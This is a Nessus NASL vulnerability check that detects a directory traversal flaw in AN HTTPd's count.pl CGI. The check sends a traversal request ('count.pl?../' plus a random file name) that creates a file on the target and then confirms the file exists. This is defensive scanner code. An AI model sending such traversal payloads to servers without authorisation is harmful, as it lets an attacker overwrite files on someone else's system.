#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if(description)
{
 script_id(11555);
 script_bugtraq_id(7397);
 script_xref(name:"OSVDB", value:"49215");
 script_version ("$Revision: 1.12 $");
 script_name(english:"AN HTTPd count.pl Traversal Arbitrary File Overwrite");
 script_summary(english:"Creates a file on the remote server");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a directory traversal
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote web server is running a CGI called 'count.pl' which is
affected by an directory traversal vulnerability. An attacker could
exploit this in order to overwrite any existing file on the remote
server, with the privileges of the httpd server." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/319354/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:P" );

script_end_attributes();

 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");

 script_family(english:"CGI abuses");
 script_require_ports("Services/www", 80);
 script_dependencies("find_service1.nasl", "http_version.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if ( report_paranoia < 2 ) exit(0);

port = get_http_port(default:80);

file = "nessus-" + rand() + "-" + rand();

r = http_send_recv3(method:"GET", item:"/isapi/" + file, port:port);
if (isnull(r)) exit(0);
res = r[2];
if("1" >< res) exit(0); # Exists already ?!

r = http_send_recv3(method:"GET", item:"/isapi/count.pl?../" + file, port:port);
if (isnull(r)) exit(0);

r = http_send_recv3(method:"GET", item:"/isapi/" + file, port:port);
if (isnull(r)) exit(0);

if ("1" >< r[2]) security_warning(port);
